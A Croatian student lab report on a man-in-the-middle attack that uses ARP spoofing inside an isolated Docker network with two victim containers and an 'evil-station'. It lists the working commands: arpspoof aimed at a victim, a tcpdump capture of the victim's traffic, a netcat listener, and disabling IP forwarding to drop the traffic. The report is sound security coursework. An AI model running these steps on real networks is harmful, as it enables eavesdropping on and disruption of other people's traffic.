# Izvještaj prve laboratorijske vježbe

### **Zadatak**

Realizirati *man in the middle* napad iskorištavanjem ranjivosti ARP protokola. Student će testirati napad u virtualiziranoj [Docker](https://docs.docker.com/get-started/overview/) mreži ([Docker container networking](https://docs.docker.com/network/)) koju čine 3 virtualizirana Docker računala (eng. *container*): dvije *žrtve* `station-1` i `station-2` te napadač `evil-station`.

### **Alati**

**Lista pokrenutih kontejnera**

```bash
$ docker ps
```

```
CONTAINER ID   IMAGE     COMMAND   CREATED         STATUS         PORTS     NAMES
7142ae607cb3   srp/arp   "bash"    4 minutes ago   Up 4 minutes             station-2
c810f9effdb1   srp/arp   "bash"    4 minutes ago   Up 4 minutes             evil-station
cec29037dbe5   srp/arp   "bash"    4 minutes ago   Up 4 minutes             station-1
---------------------------------------------------------------------------------------
```

**Pokretanje interaktivnog shella**

```bash
$ docker exec -it evil-station bash
```

**Na kontejneru pomoću netceta otvaramo server TCP socket na portu 8080**

```bash
$ netcat -l -p 8080
```

**Dohvaćenje konfiguracije mrežnog interfejsa**

```bash
$ ifconfig
```

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.4  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:ac:12:00:04  txqueuelen 0  (Ethernet)
        RX packets 68  bytes 8291 (8.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

**Pokrećemo arpspoof**

```bash
$ arpspoof -i eth0 -t station-1 station-2
```

**Pokrećemo tcpdump u kontejneru `evil-station` i pratimo promet**

```bash
$ tcpdump -X host station-1 and not arp
```

**Gasimo prosljeđivanje spoofanih paketa**

```bash
$ echo 0 > /proc/sys/net/ipv4/ip_forward
```